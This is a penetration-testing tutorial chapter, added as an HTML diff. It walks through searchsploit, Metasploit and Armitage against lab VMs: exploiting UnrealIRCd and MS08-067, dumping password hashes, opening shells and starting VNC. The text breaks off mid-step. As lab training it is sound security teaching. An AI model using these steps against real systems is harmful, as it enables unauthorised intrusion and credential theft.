@@ -1,0 +1,1041 @@
+<html><head></head><body>
+        <section>
+
+                            <header>
+                    <h1 class="header-title">Finding Exploits in the Target</h1>
+                </header>
+            
+            <article>
+                
+<p>In this chapter, we will cover the following topics:</p>
+<ul>
+<li>Searching the local exploit database</li>
+<li>Searching the online exploit database</li>
+<li>The Metasploit setup and configuration</li>
+<li>The Armitage setup</li>
+<li>Basic exploit attacks with Armitage</li>
+<li>Advanced attacks with Armitage</li>
+<li>Using the backdoor factory and Armitage</li>
+</ul>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">Introduction</h1>
+                </header>
+            
+            <article>
+                
+<p>In this chapter, we will take the host information that we have accumulated to determine the potential exploits to use against target machines and services. It is important to note that as you work through this section, you are going to be launching attacks against hosts. These attacks are going to create noise on the network that may be picked up by security devices. Under typical circumstances, you will spend substantial time validating whether your target is truly vulnerable to an exploit before launching it, so you don't create any unnecessary information that could be used to determine an active attack against a device.</p>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">Searching the local exploit database</h1>
+                </header>
+            
+            <article>
+                
+<p>The searchsploit database is a local exploit database that comes standard with Kali. This is a great way to search for exploits offline or when you have no internet connectivity. Because of it's offline search capabilities, it's great for when you are operating in an air-gapped location.</p>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">Getting ready</h1>
+                </header>
+            
+            <article>
+                
+<p>Let's ensure the following prerequisites:</p>
+<ul>
+<li>Kali Linux is running, and you are logged in as root</li>
+<li>Validate internet connectivity</li>
+</ul>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">How to do it...</h1>
+                </header>
+            
+            <article>
+                
+<p>We will now search the local exploit database:</p>
+<ol>
+<li class="p1">Open the terminal screen by clicking on the terminal icon on the top left. <img src="assets/7dcddfa6-829b-4b59-8756-ba029ec171d5.png"/></li>
+<li class="p1">From the main terminal screen, you should be at a Command Prompt of <kbd>root@kali:~#</kbd>.</li>
+<li class="p1">Review searchsploit options by entering the following command:</li>
+</ol>
+<pre style="padding-left: 60px"><strong>searchsploit</strong></pre>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">Update searchsploit</h1>
+                </header>
+            
+            <article>
+                
+<p>We must start by ensuring our searchsploit database is updated:</p>
+<ol>
+<li>From the main terminal prompt, enter the following command to update the searchsploit database:</li>
+</ol>
+<pre style="padding-left: 60px"><strong>searchsploit -u</strong></pre>
+<div class="packt_tip">Regularly updating Kali with the APT package manager will also automatically update the database.</div>
+<ol start="2">
+<li>Install additional modules required to run some functions of searchsploit:</li>
+</ol>
+<pre style="padding-left: 60px"><strong>apt install -y libxml2-utils</strong></pre>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">Run a simple query</h1>
+                </header>
+            
+            <article>
+                
+<p>We will run a simple query against our searchsploit database:</p>
+<ol>
+<li>From the main terminal prompt, let's run a simple query looking for a known SMB vulnerability, <kbd>MS17-010</kbd>. You may recognize this as the vulnerability associated with WannaCry as well as other various malware worms:</li>
+</ol>
+<pre style="padding-left: 60px"><strong>searchsploit MS17-010</strong></pre>
+<ol start="2">
+<li>You will receive the following output:</li>
+</ol>
+<div class="CDPAlignCenter CDPAlign"><img class="image-border" src="assets/0b7eb2b9-0ab4-4ac8-b61a-575a9ec7d14e.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">Searchsploit console output</div>
+<ol start="3">
+<li>Let's take a look at some of the specifics related to one of the query results:</li>
+</ol>
+<pre style="padding-left: 60px"><strong>nano /usr/share/exploitdb/platforms/windows/dos/41891.rb</strong></pre>
+<ol start="4">
+<li>The following output will show you that you are looking at a Metasploit module. This module is specifically designed to search devices to see whether they are vulnerable to this exploit.</li>
+</ol>
+<div class="packt_tip packt_infobox">We will discuss Metasploit shortly, but it's important to note that if this a vulnerability is not included in the default Metasploit database, we can import it for use.</div>
+<div class="CDPAlignCenter CDPAlign"><img height="380" width="684" class="image-border" src="assets/44cf2077-5729-42ed-a9eb-b8044d7ac986.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">Nano output of a specific exploit</div>
+<ol start="5">
+<li>To exit the nano editor, type <kbd>&lt;control&gt;-x</kbd>; if you are asked to save modified buffer, type <kbd>n</kbd>.</li>
+</ol>
+<div class="packt_tip packt_infobox">Explore some of the other results; you will note that <kbd>41987.py</kbd> is an exploit for this vulnerability written in Python.</div>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">Understanding search options in searchsploit</h1>
+                </header>
+            
+            <article>
+                
+<p>There are several parameters you can search for using searchsploit; try the following examples.</p>
+<ol>
+<li>The following command will search just the titles of the exploit database for <kbd>windows</kbd> and <kbd>remote</kbd>, allowing you to find the potential remote windows vulnerabilities:</li>
+</ol>
+<pre style="padding-left: 60px"><strong>searchsploit -t windows remote</strong></pre>
+<ol start="2">
+<li>If you exported your nmap or zenmap results in an XML format, you can search against that for exploits. Run a quick <kbd>nmap</kbd> and output its results to <kbd>/root/test.xml</kbd>. The following command is used to search against that output file and will provide you with a list of exploits for your nmap search:</li>
+</ol>
+<pre style="padding-left: 60px"><strong>searchsploit --nmap /root/test.xml</strong></pre>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">Searching the online exploit database</h1>
+                </header>
+            
+            <article>
+                
+<p>We will use Firefox to review an online exploit database at <a href="https://www.exploit-db.com/">www.exploit-db.com</a>.</p>
+<p>The <kbd>exploit-db.com</kbd> site will have all the information in the searchsploit database, but some may find the web GUI interface easier to use and navigate. There may also be some slightly newer information on the website as the searchsploit database is only updated on a weekly basis. The <kbd>CAPTCHA</kbd> function of the website is one significant drawback of using the website.</p>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">Getting ready</h1>
+                </header>
+            
+            <article>
+                
+<p>Let's ensure the following prerequisites:</p>
+<ul>
+<li>Kali Linux is running and you are logged in as root</li>
+<li>Validate internet connectivity</li>
+</ul>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">How to do it...</h1>
+                </header>
+            
+            <article>
+                
+<p>We will now perform searches through the online exploit database:</p>
+<ol>
+<li>From the main interface, launch the Firefox application. <img src="assets/cbf60cb0-12d3-497b-ae7e-b13a660fdf39.png"/></li>
+<li>Go to the site named <a href="https://www.exploit-db.com/search">https://www.exploit-db.com/search</a>.</li>
+<li>Enter <kbd>windows remote</kbd> <span>in the search term, click on</span> <span class="packt_screen"><span>re</span>CAPTCHA</span><span>, and select</span> <span class="packt_screen">Search</span>:</li>
+</ol>
+<p><img class="image-border" src="assets/c2132489-e169-4e5e-acc2-770b0fd935a6.png"/></p>
+<div class="packt_figref CDPAlignCenter CDPAlign">Firefox screen capture of the exploit-db.com website</div>
+<ol start="4">
+<li>You will be provided with an output as shown in the following screenshot. You will notice that you have a lot of clickable options to navigate through the database. You can use this to get more information and refine your searches:</li>
+</ol>
+<div class="CDPAlignCenter CDPAlign"><img class="image-border" src="assets/46b052eb-77a5-4632-94ad-aed2d805d3c0.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">Firefox screen capture of the exploit-db.com website vulnerability list</div>
+<div class="packt_tip">Click on the orange <span class="packt_screen">More Options</span><strong> </strong>button to see additional search query options and try a few searches.</div>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">The Metasploit setup and configuration</h1>
+                </header>
+            
+            <article>
+                
+<p>The Metasploit Framework now comes as part of the Kali installation, thus making the setup and the initial configuration a relatively simple process.</p>
+<p>The Metasploit Framework is an open source development tool for creating and executing exploit code against machines. In the later releases of Kali, it has now become part of the core bundle of tools, and therefore very little setup is required to get it operational. In this recipe, we will take you through those few steps and get you up and run.</p>
+<div class="packt_infobox">Note that both the Metasploit Framework and Armitage use the same backend database, therefore if you have already initialized the database, skip to the heading – starting the <em>Metasploit framework <span>initialization and startup </span></em>section.</div>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">Getting ready</h1>
+                </header>
+            
+            <article>
+                
+<p>Let's ensure the following prerequisites:</p>
+<ul>
+<li>Kali Linux is running, and you are logged in as root</li>
+<li>Make sure you have run the updates recently</li>
+<li>Validate internet connectivity</li>
+</ul>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">How to do it...</h1>
+                </header>
+            
+            <article>
+                
+<p>There are several steps in preparing to use the Metasploit console that we will go through in this section.</p>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">Metasploit Framework initialization and startup</h1>
+                </header>
+            
+            <article>
+                
+<ol>
+<li>Begin by opening a terminal window by clicking on the terminal icon on the left. <img src="assets/d29267da-7f1a-42a0-a025-e62917507ac8.png"/></li>
+<li>Metasploit uses a database to store information about targets, exploits, and other information. We need to begin by starting the database daemon. From the Command Prompt enter<span> the following commands:</span></li>
+</ol>
+<pre style="padding-left: 60px"><strong>service postgresql start</strong></pre>
+<ol start="3">
+<li>Next, we will initialize the database (this only needs to be done once when first starting it):</li>
+</ol>
+<pre style="padding-left: 60px"><strong> msfdb init</strong></pre>
+<div class="packt_tip">If you ever need to reinitialize the database to start over, you can use the <kbd>msfdb reinit</kbd> command. Be warned that all the existing data will be lost.</div>
+<ol start="4">
+<li>Now, we can start the Metasploit console:</li>
+</ol>
+<pre style="padding-left: 60px"><strong>msfconsole</strong></pre>
+<ol start="5">
+<li>You will now be dropped in the main MSF screen. Note that your Command Prompt has now changed to <kbd>msf &gt;</kbd><strong> </strong>to indicate you are now in the console:</li>
+</ol>
+<div class="CDPAlignCenter CDPAlign"><img height="434" width="571" class="alignnone size-full wp-image-945 image-border" src="assets/732b0aeb-3b85-4df3-8ca0-ff8921333de4.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">msfconsole screen</div>
+<div class="packt_tip">Your screen may look different to the previous screenshot. When the Metasploit Framework starts, it picks a different text based image (banner) to start with. You can run through them by typing <kbd>banner</kbd> at the <kbd>msf &gt;</kbd> prompt.</div>
+<ol start="6">
+<li>Let's validate our database is connected and operating properly. From the <kbd>msf &gt;</kbd> prompt type the following command, if all is working well, you should see <span class="packt_screen">[*] postgresql connected to msf</span>:</li>
+</ol>
+<pre style="padding-left: 60px"><strong>db_status</strong></pre>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">Starting the Metasploit console</h1>
+                </header>
+            
+            <article>
+                
+<p><span>From the Command Prompt</span>,<span> type the following:</span></p>
+<pre><strong>service postgresql start</strong><br/><strong>msfconsole</strong></pre>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">Stopping the Metasploit console </h1>
+                </header>
+            
+            <article>
+                
+<p><span>From the </span><kbd>msf &gt;</kbd><span> console, type the following:</span></p>
+<pre><strong>quit</strong><br/><strong>service postgresql stop</strong></pre>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">There's more...</h1>
+                </header>
+            
+            <article>
+                
+<p>Although you can do all your work from the command line, we are going to use Armitage moving forward, Armitage is a GUI frontend to the Metasploit Framework. If you want to get more information on using the command line, two great resources are here:</p>
+<ul>
+<li>MSFconsole commands tutorial: <a href="https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/">https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/</a></li>
+<li>Metasploit cheat sheet: <a href="https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf">https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf</a></li>
+</ul>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">The Armitage setup</h1>
+                </header>
+            
+            <article>
+                
+<p>Armitage is a graphical frontend to the Metasploit Framework.</p>
+<p>In this recipe, we will be setting up the Armitage graphical user interface for the Metasploit Framework. Based on your preference, you may like the GUI versus the command-line experience. However, you can use them both interchangeably at anytime because of their common database.</p>
+<div class="packt_infobox">Note that both the Metasploit Framework and Armitage use the same backend database, therefore if you have already initialized the database, skip to the section on starting Armitage.</div>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">Getting ready</h1>
+                </header>
+            
+            <article>
+                
+<p>Let's ensure the following prerequisites:</p>
+<ul>
+<li>Kali Linux is running, and you are logged in as root</li>
+<li>Make sure you have run the updates recently</li>
+<li>Validate internet connectivity</li>
+</ul>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title"> Armitage initialization and startup</h1>
+                </header>
+            
+            <article>
+                
+<p>We shall now initialize and start up Armitage:</p>
+<ol>
+<li>Begin by opening a terminal window by clicking on the terminal icon on the left. <img src="assets/404eda68-40fd-4546-b96a-3ff07a0396ff.png"/></li>
+<li>Metasploit uses a database to store information about targets, exploits, and other information. We need to begin by starting the database daemon. From the Command Prompt, <span>type the following:</span></li>
+</ol>
+<pre style="padding-left: 60px"><strong>service postgresql start</strong></pre>
+<ol start="3">
+<li>Next, we will initialize the database (this only needs to be done once when first starting it):</li>
+</ol>
+<pre style="padding-left: 60px" class="mce-root"><strong> msfdb init</strong></pre>
+<div class="packt_tip">If you ever need to reinitialize the database to start over, you can use the <kbd>msfdb reinit</kbd> command. Be warned that all the existing data will be lost.</div>
+<ol start="4">
+<li>Start Armitage by typing this:</li>
+</ol>
+<pre style="padding-left: 60px"><strong>armitage</strong></pre>
+<ol start="5">
+<li>Click on <span class="packt_screen">Connect</span> as shown in the following screenshot:</li>
+</ol>
+<div class="CDPAlignCenter CDPAlign"><img height="180" width="255" class="alignnone size-full wp-image-946 image-border" src="assets/699033fc-d7d7-4a38-a059-85d5390c81de.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">Armitage database connection screen</div>
+<ol start="6">
+<li>Select <span class="packt_screen">Yes</span> when asked to start the Metasploit RPC server:</li>
+</ol>
+<div class="CDPAlignCenter CDPAlign"><img height="153" width="278" class="alignnone size-full wp-image-947 image-border" src="assets/b9e95aad-124c-45ac-acc0-ebdff6572bb6.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">Armitage start RPC server screen</div>
+<div class="packt_tip">You may be asked for the IP address of your computer. Enter the IP address that you assigned to your host-only network. In my case it's <kbd>192.168.56.102</kbd>.</div>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">Stopping Armitage</h1>
+                </header>
+            
+            <article>
+                
+<p>To stop Armitage and exit:</p>
+<ol>
+<li>To exit, click on <span class="packt_screen">Armitage</span> at the top, and select <span class="packt_screen">Close</span>:</li>
+</ol>
+<div class="CDPAlignCenter CDPAlign"><img height="191" width="266" class="alignnone size-full wp-image-948 image-border" src="assets/9d210521-6f99-4958-a6f3-02030213e265.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">Armitage menu with close option</div>
+<ol start="2">
+<li>From the Command Prompt, type the following:</li>
+</ol>
+<pre style="padding-left: 60px"><strong>service postgresql stop</strong></pre>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">Basic exploit attacks with Armitage</h1>
+                </header>
+            
+            <article>
+                
+<p>In this recipe, we will perform some very basic tasks of Armitage including loading an nmap scan, performing an nmap scan, finding attacks to use against the target, and exploiting the target machine. </p>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">Getting ready</h1>
+                </header>
+            
+            <article>
+                
+<p>Let's ensure the following prerequisites:</p>
+<ul>
+<li>Kali Linux is running, and you are logged in as root</li>
+<li>Make sure Armitage is running</li>
+<li>Make sure, at a minimum, the Metasploitable VM and Windows XP VM are running; feel free to turn on other target hosts as you wish</li>
+</ul>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">How to do it...</h1>
+                </header>
+            
+            <article>
+                
+<p>From the main Armitage screen, we must start by finding our targets on the network. We have the ability to import hosts from prior nmap scans or run nmap from the Armitage console itself.</p>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">Import an nmap scan</h1>
+                </header>
+            
+            <article>
+                
+<p>We will begin by importing an nmap scan into Armitage:</p>
+<ol>
+<li>Select <span class="packt_screen">Hosts</span> | <span class="packt_screen">Import Hosts</span> from the top:</li>
+</ol>
+<div class="CDPAlignCenter CDPAlign"><img height="133" width="217" class="alignnone size-medium wp-image-591 image-border" src="assets/d361e47c-c2cb-4f70-b948-d014ab16390a.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">Armitage import hosts menu</div>
+<ol start="2">
+<li>Browse the file system, and select your nmap output XML file; click on <span class="packt_screen">Open</span>:</li>
+</ol>
+<div class="CDPAlignCenter CDPAlign"><img height="223" width="323" class="alignnone size-medium wp-image-592 image-border" src="assets/36dc10cd-5ec4-431b-8150-adbb7cc1e595.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">Armitage open file dialog box</div>
+<ol start="3">
+<li>You will now see your nmap scan results populated, and you may begin working on the devices:</li>
+</ol>
+<div class="CDPAlignCenter CDPAlign"><img height="490" width="645" class="alignnone size-full wp-image-949 image-border" src="assets/23a07b7d-2464-4b9f-939c-6a54f64c465f.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">Armitage nmap scan import results populated on screen</div>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">Perform an nmap scan from the Armitage interface</h1>
+                </header>
+            
+            <article>
+                
+<p>To perform an nmap scan from within Armitage do the following:</p>
+<ol>
+<li>Select <span class="packt_screen">Hosts</span> | <span class="packt_screen">Nmap Scan</span> | <span class="packt_screen">Intense Scan</span><strong> </strong>from the top:</li>
+</ol>
+<div class="CDPAlignCenter CDPAlign"><img height="194" width="342" class="alignnone size-medium wp-image-594 image-border" src="assets/62f03cff-1531-4528-9009-d16bf7e099de.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">Armitage nmap scan menu</div>
+<ol start="2">
+<li>Enter our scan range; in this case, we will scan our entire <kbd>192.168.56.0/24</kbd> network, and click on <span class="packt_screen">OK</span>. This scan can take a couple minutes to complete, so just be patient:</li>
+</ol>
+<div class="CDPAlignCenter CDPAlign"><img height="128" width="263" class="alignnone size-medium wp-image-595 image-border" src="assets/ef561ca5-46af-4045-adf2-6dc40f4315fa.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">Armitage nmap input range dialog box</div>
+<ol start="3">
+<li>Once finished, you will see a scan complete notification; and your console will now display your hosts. You can also close the nmap output window by clicking on the <span class="packt_screen">nmap</span> <span class="packt_screen">x</span> near nmap toward the middle of the screen:</li>
+</ol>
+<div class="CDPAlignCenter CDPAlign"><img height="533" width="668" class="alignnone size-full wp-image-950 image-border" src="assets/2026e7fb-2ba3-4d3e-8f6f-3cdf9ad1089a.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">Armitage nmap scan results populated on screen</div>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">Find attacks against a host</h1>
+                </header>
+            
+            <article>
+                
+<p>We will use armitage to find attacks against hosts:</p>
+<ol>
+<li>At this point, let's work with our Metasploitable machine, which currently has an IP address of <kbd>192.168.56.104</kbd>. Click on it once to select it (this will be denoted with a green dotted outline).</li>
+<li>If you right-click on the device, you will see a variety of options - select <span class="packt_screen">Services</span><span>. This will bring up a list of all listening ports and services for that host. Scroll down a bit and take a look at all the information provided:</span></li>
+</ol>
+<div class="CDPAlignCenter CDPAlign"><img height="478" width="664" class="alignnone size-full wp-image-951 image-border" src="assets/6b0bf026-316b-4348-936d-29a9e5004e4e.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">Armitage host services screen</div>
+<ol start="3">
+<li>Let's find some possible attacks against the hosts. Click on <span class="packt_screen">Attacks</span> | <span class="packt_screen">Find Attacks</span> from the top. This could take a minute or two for it to correlate the information. When completed, you will receive an <span class="packt_screen">Attack Analysis Complete..</span><span class="packt_screen">.</span> dialog box. Select <span class="packt_screen">OK</span> to close it:</li>
+</ol>
+<div class="CDPAlignCenter CDPAlign"><img height="407" width="1024" class="alignnone size-full wp-image-952 image-border" src="assets/01ffd43c-ede4-4b82-9347-6b8268d2ceb4.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">Armitage find attacks menu</div>
+<ol start="4">
+<li>Now, if we right-click on our host, we will see a new menu item labeled attack. Scroll through all the possible attack options you see there:</li>
+</ol>
+<div class="CDPAlignCenter CDPAlign"><img height="439" width="1024" class="alignnone size-full wp-image-953 image-border" src="assets/0c1b2e18-2690-40ff-8b55-c1ab2862677a.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">Armitage attack menu</div>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">Exploit the host</h1>
+                </header>
+            
+            <article>
+                
+<p>We will now launch an exploit against a host:</p>
+<ol>
+<li>Now that we have attacks that will potentially compromise a host, let's go ahead and select one to run. Let's right-click on our Metasploitable machine, and select <span class="packt_screen">Attack</span> | <span class="packt_screen">irc</span> | <span class="packt_screen">unreal_ircd_3281_backdoor</span>.</li>
+<li>You will be presented with options that you may have to scroll through and change. For instance, your <span class="packt_screen">LHOST</span> should be the interface toward your target VMs. Make any needed changes, and click on <span class="packt_screen">Launch</span>:</li>
+</ol>
+<div class="CDPAlignCenter CDPAlign"><img height="288" width="430" class="alignnone size-full wp-image-954 image-border" src="assets/4e97f44a-a269-4600-877d-e290199986e6.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">Armitage exploit launch dialog</div>
+<div class="packt_tip">Be patient, it may look like things have stalled or failed, but it will continue.</div>
+<ol start="3">
+<li>You will now see that the Metasploitable device icon has changed to show it has been owned:</li>
+</ol>
+<div class="CDPAlignCenter CDPAlign"><img height="534" width="703" class="alignnone size-full wp-image-955 image-border" src="assets/3e477c47-f448-4873-b914-93fd82a729bc.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">Armitage main screen with indicator of exploited device</div>
+<ol start="4">
+<li>So now that the device has been owned, let's run a couple of simple commands. By right-clicking on the device, we will now see a new action called <span class="packt_screen">Shell 1</span>; from there, we will select <span class="packt_screen">Interact</span>:</li>
+</ol>
+<div class="CDPAlignCenter CDPAlign"><img height="397" width="1024" class="alignnone size-full wp-image-956 image-border" src="assets/ba35b338-999f-4f8e-be66-b1c3b642d358.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">Armitage shell interact screen</div>
+<ol start="5">
+<li>You will now be presented with a new <span class="packt_screen">Shell 1</span> tab on the bottom with a <span class="packt_screen">$</span> prompt. Let's see who we are on the box by entering the following command at the <span class="packt_screen">$</span> prompt:</li>
+</ol>
+<pre style="padding-left: 60px"><strong>whoami</strong></pre>
+<ol start="6">
+<li>This should return the user you are currently authenticated as; in our case, we are root:</li>
+</ol>
+<div class="CDPAlignCenter CDPAlign"><img height="256" width="692" class="alignnone size-full wp-image-957 image-border" src="assets/56bd3121-bcbd-49aa-a7d7-eba470ed1b72.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">Armitage shell whoami output</div>
+<ol start="7">
+<li>Just to validate how much damage we can do to this machine, let's enter the following at the <span class="packt_screen">$</span> prompt:</li>
+</ol>
+<pre style="padding-left: 60px"><strong>cd /bin </strong><br/><strong>touch youhavebeenowned</strong><br/><strong>chmod 777 youhavebeenowned</strong></pre>
+<ol start="8">
+<li>Now, let's login to our Metasploitable VM login with <kbd>msfadmin</kbd>/<kbd>msfadmin</kbd>, and run the following command:</li>
+</ol>
+<pre style="padding-left: 60px"><strong>ls -lai /bin/youhavebeenowned</strong></pre>
+<ol start="9">
+<li>You will see from the output that the file is there, it exists in the <kbd>bin</kbd> directory, and has read, write, and execute for user, group and everyone:</li>
+</ol>
+<div class="CDPAlignCenter CDPAlign"><img height="103" width="1024" class="alignnone size-full wp-image-958 image-border" src="assets/8f42c49a-8a5f-4b6a-83eb-1abcd958e78a.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">Armitage command output</div>
+<div class="packt_tip">The Hail Mary Attack - There is an attack listed as the Hail Mary. In short - Don't do it. It's noisy and will just throw everything after a target. It might be useful in a lab situation if you have a sample VM you are looking for exploits in, but for a live network or across the Internet, it will be seen very easily and is typically just an indication of the lack of experience and skill of the tester.</div>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">Advanced attacks with Armitage</h1>
+                </header>
+            
+            <article>
+                
+<p>In this recipe, we will now perform an advanced attack with Armitage against a Windows XP machine. We will perform several different functions such as initial exploitation, VNC access, downloading, and viewing files.</p>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">Getting started</h1>
+                </header>
+            
+            <article>
+                
+<p>Let's ensure the following prerequisites:</p>
+<ul>
+<li>Kali Linux is running, and you are logged in as root</li>
+<li>Make sure Armitage is running</li>
+<li>Make sure at a minimum the Windows XP VM is running - feel free to turn on other target hosts as you wish</li>
+</ul>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">How to do it...</h1>
+                </header>
+            
+            <article>
+                
+<p>From our Armitage screen, let's select the Windows XP VM for this section.</p>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">Initial exploitation</h1>
+                </header>
+            
+            <article>
+                
+<p>We will perform an initial exploitation of our windows VM:</p>
+<ol>
+<li>Right-click on the Windows XP VM, and select <span class="packt_screen">Attack</span> | <span class="packt_screen">smb</span> | <span class="packt_screen">ms08_067_netapi</span>:</li>
+</ol>
+<div class="CDPAlignCenter CDPAlign"><img height="405" width="1024" class="alignnone size-full wp-image-959 image-border" src="assets/96b1659e-fce1-4c39-b2c1-9d19983ab78d.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">Armitage attack options</div>
+<ol start="2">
+<li>Make any modifications necessary including changing the <span class="packt_screen">LHOST</span> if needed to the IP address on the VM network. Once ready, click on <span class="packt_screen">Launch</span>:</li>
+</ol>
+<div class="CDPAlignCenter CDPAlign"><img height="256" width="382" class="alignnone size-full wp-image-960 image-border" src="assets/299fa1f8-6539-4150-99ab-a2abff27eb33.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">Armitage attack dialog box</div>
+<ol start="3">
+<li>You will now see that the Windows XP VM machine device's icon has been changed to again identify that this machine has been owned.</li>
+</ol>
+<div class="CDPAlignCenter CDPAlign"><img height="393" width="1024" class="alignnone size-full wp-image-961 image-border" src="assets/663ffd3b-5b13-49d0-9b72-6c0416f39091.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">Armitage main screen with indication of exploited device</div>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">Dump hashes</h1>
+                </header>
+            
+            <article>
+                
+<p>We will now perform a password hash dump of the windows VM:</p>
+<ol>
+<li>Let's now dump the user hashes, so we can crack them later and use them as part of other exploits. Start by right-clicking on the Windows XP VM, and you will see a new option. Select <span class="packt_screen">Meterpreter 3</span> | <span class="packt_screen">Access</span> | <span class="packt_screen">Dump Hashes</span> | <span class="packt_screen">registry method</span>;<span class="packt_screen"> </span>at the next screen, select <span class="packt_screen">Launch</span>.</li>
+<li>You will now see the hashes dumped to the screen, and they will also be saved in our loot store. Also, take a look through the output file; and you will see that password hints were also dumped. Jane Doe's password hint is <kbd>jane123</kbd> - Could that be her password?</li>
+</ol>
+<div class="CDPAlignCenter CDPAlign"><img height="361" width="1024" class="alignnone size-full wp-image-962 image-border" src="assets/786c8fa7-ca57-45e7-a092-781ceeaf7976.png"/></div>
+<div class="packt_figref CDPAlignCenter CDPAlign">armitage hashdump output</div>
+<ol start="3">
+<li>If you close the dump hashes window, you can go back in and click on <span class="packt_screen">View</span> | <span class="packt_screen">Loot</span>; and double-click on the host to see the hashes.</li>
+</ol>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    <h1 class="header-title">Interacting with the Windows machine</h1>
+                </header>
+            
+            <article>
+                
+<p>We will now open a command shell to interact with the Windows VM directly:</p>
+<ol>
+<li>Right-click on the Windows XP VM, and select <span class="packt_screen">Meterpreter</span> <span class="packt_screen">3</span> |<span class="packt_screen"> Interact</span> | <span class="packt_screen">Command Shell</span>.</li>
+<li>Try running some Windows commands, and see what you get back:</li>
+</ol>
+<pre style="padding-left: 60px"><strong>dir </strong><br/><strong>cd / </strong><br/><strong>dir</strong></pre>
+<ol start="3">
+<li>Now, let's start VNC and see what we can do from the desktop. Right-click on the Windows XP VM, and select <span class="packt_screen">Meterpreter 3</span> | <span class="packt_screen">Interact</span> |<span class="packt_screen"> Desktop (VNC)</span>. You will be presented with a screen similar as follows. Note the port number for this VNC session:</li>
+</ol>
